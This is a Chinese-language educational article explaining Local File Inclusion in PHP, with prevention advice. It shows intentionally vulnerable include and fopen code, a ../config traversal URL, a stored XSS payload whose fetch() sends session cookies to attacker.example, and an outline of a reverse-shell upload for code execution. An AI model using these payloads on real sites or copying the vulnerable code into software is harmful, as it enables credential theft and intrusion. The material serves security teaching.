---
title: 本地文件包含（LFI）
date: 2026-05-11
summary: 本地文件包含 (LFI) 是一种 Web 漏洞，它允许恶意黑客访问、查看和/或包含位于文档根文件夹中的 Web 服务器文件系统中的文件。
tags: 漏洞库, Web安全, 文件包含
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# 本地文件包含（LFI）

### 什么是本地文件包含？

本地文件包含 (LFI) 是一种 Web 漏洞，它允许恶意黑客访问、查看和/或包含位于文档根文件夹中的 Web 服务器文件系统中的文件。

<br>

### 本地文件包含如何工作

在编写 Web 应用程序时，开发人员经常需要访问位于应用程序目录或其子目录中的其他服务器端文件。 例如，开发人员可能希望包含配置文件和应用程序模块，或者访问和显示用户上传的文件，例如图像或文本文件。

为了访问非静态文件，开发人员通常通过用户输入参数传递文件名。 例如，如果应用程序要显示用户上传的图像，应用程序的作者可能会决定允许为这些图像任意命名。 对于像 PHP 这样的脚本语言，开发人员可能还需要动态包含包含源代码的文件。

为了访问非静态文件，开发人员通常通过用户输入参数传递文件名。 例如，如果应用程序要显示用户上传的图像，应用程序的作者可能会决定允许为这些图像任意命名。 对于像 PHP 这样的脚本语言，开发人员可能还需要动态包含包含源代码的文件。

当恶意用户可以在用户输入中包含任意文件名或路径时，就会发生本地文件包含漏洞。 例如，如果应用程序旨在根据 URL 参数显示任意图像，但攻击者能够使用此功能显示应用程序源代码，则该应用程序存在 LFI 漏洞。 请注意，如果攻击者可以包含来自远程位置的恶意文件，我们就是在谈论远程文件包含 (RFI) 漏洞。

<br>

### 本地文件包含 与 目录遍历

本地文件包含漏洞经常与目录遍历（path traversal）混淆，两者有相似之处但不是同一种漏洞：

- LFI 意味着攻击者可以包含位于文档根目录及其子目录内的源代码文件或查看文件，但这并不意味着攻击者可以到达文档根目录之外。

- 目录遍历是指攻击者可以访问位于文档根目录之外的文件，例如日志文件或passwd文件，攻击不涉及运行任何恶意代码。

这两个漏洞经常被混淆，因为它们经常一起出现并且具有相同的根本原因：开发人员允许将本地文件的路径作为用户输入的一部分传递。

<br>

### 本地文件包含攻击示例

以下是具有本地文件包含漏洞的 PHP 代码示例，以及针对包含此代码的应用程序的不同 LFI 攻击媒介。

<br>

#### 导致敏感信息泄露的LFI

PHP 应用程序的开发人员希望用户能够阅读存储在 Web 服务器上的文本文件中的诗歌。 这些诗歌被写入文本文件，由其他用户上传，并存储在相对的诗歌目录中。 然后，诗歌作为 HTML 页面的一部分显示在 Web 浏览器中。 以下是 poems/display.php 文件中的代码片段。

<font color="#e90"><\?PHP </font>
    <font color="#a67f59">\$file = \$_GET</font>[<font color="#00dd00">"file"</font>];
    <font color="#a67f59">\$handle =</font> <font color="#00dd00">fopen</font>(<font color="#a67f59">\$file</font>, <font color="#00dd00">'r'</font>);
    <font color="#a67f59">\$poem</font> = <font color="#00dd00">fread</font>(<font color="#a67f59">\$handle</font>, <font color="red">1</font>);
    <font color="#00dd00">fclose</font>(<font color="#a67f59">\$handle</font>);
    <font color="#00dddd">echo</font> <font color="#a67f59">\$poem</font>;
<font color="#e90">?></font>

如您所见，文件名直接取自 HTTP 请求标头。 因此，您可以使用以下 URL 访问并显示一首名为 poem.txt 的诗：

        http://victim.example/my_app/display.php?file=poem.txt

##### 攻击向量

攻击者通过使用以下有效负载操纵 GET 请求来滥用此脚本：

        http://victim.example/my_app/display.php?file=../config/database.php

display.php 脚本向上导航到文档根目录，然后向下导航到 /config/ 子目录。 在那里，它包括数据库配置文件 database.php，其中包含用于连接到数据库的用户名和密码。 数据作为 HTML 代码的一部分公开，攻击者只需检查页面的源代码即可了解如何直接访问数据库。

#### 导致跨站点脚本的 LFI

攻击者还可能使用上述代码将攻击升级为存储型跨站点脚本 (XSS)。

##### 攻击向量

攻击者首先使用诗歌文件上传功能将以下“诗歌”上传为名为 poem42.txt 的文本文件：

        <script>fetch("http://attacker.example?log="+encodeURIComponent(document.cookie));</script>

然后，攻击者提交包含这首诗的请求：

        http://victim.example/my_app/display.php?file=poem42.txt

由于这首诗的内容旨在作为 HTML 代码的一部分直接显示，因此页面代码现在包含一个存储的跨站点脚本漏洞。 攻击者可以将此链接传递给任意数量的受害者，任何打开它的人都会将他们的会话 cookie 发送到攻击者控制的 attacker.example 站点。

#### 导致远程代码执行的 LFI

同一 PHP 应用程序的开发人员还希望能够动态地包含模块。 以下是 index.php 文件中的代码片段。

<font color="#e90"><?PHP </font>
  <font color="#a67f59">\$module</font> = <font color="#a67f59">\$_GET</font>[<font color="#00dd00">"module"</font>];
  <font color="#00dddd">include</font> <font color="#a67f59">\$module</font>;
<font color="#e90">?></font>

同样，文件名直接取自 GET HTTP 请求。 因此，您可以包含模块 welcome.php 如下：

        http://victim.example/index.php?module=welcome.php

##### 攻击向量

攻击者首先使用诗歌上传功能上传poem42.txt，其中包含pentest monkey反向shell的PHP源代码。

然后，攻击者操纵对 index.php 的 GET 请求以包含诗歌而不是模块：

        http://victim.example/index.php?module=poems/poem42.txt

结果，应用程序运行反向 shell（远程代码执行）的代码，允许攻击者远程访问服务器命令行。

<br>

### 本地文件包含攻击的潜在后果

从上面的示例中可以看出，本地文件包含漏洞可能会产生多种后果，具体取决于易受攻击的应用程序的功能。 这里有些例子：

- 如果应用程序显示任意图像，它可用于显示敏感信息，例如源代码或配置文件。

- 如果应用程序允许您下载任意文件（例如 PDF 文件），则它可用于下载敏感信息（例如源代码或配置文件）。

- 如果应用程序包含任意文件内容作为 HTML 页面的一部分，它可用于利用跨站点脚本漏洞。

- 如果应用程序动态包含任意源代码文件并且攻击者能够上传或更改文件，则它可用于升级为远程代码执行。

<br>

### 如何防止Web应用中的本地文件包含漏洞

有几种方法可以让您防止代码中的本地文件包含漏洞：

- 完全避免在用户输入中传递文件名。 这不仅包括直接用户输入，还包括攻击者可以操纵的其他数据源，例如 cookie。
如果您的应用程序要求您使用用户输入的文件名并且没有办法解决它，请创建一个安全文件白名单。
- 如果您因为使用任意文件名而无法创建白名单（例如，如果用户上传文件），请将文件名存储在数据库中并在用户输入中使用表行标识符。 您还可以使用 URL 映射来识别没有本地文件包含风险的文件。
- 上述方法在每种编程语言中都可用，因此每个开发人员都可以通过使用安全编码技术轻松防止本地文件包含漏洞。 没有理由在您的代码中包含本地文件。

注意：不要依赖黑名单、编码或输入验证/清理方法（例如过滤）来防止包含本地文件。 例如，不要试图限制或强制执行文件扩展名或阻止特殊字符序列作为您免受 LFI 的唯一保护。 攻击者可以使用多种不同的方法（例如 URL 编码和包装器（例如 php://filter）来绕过此类过滤器。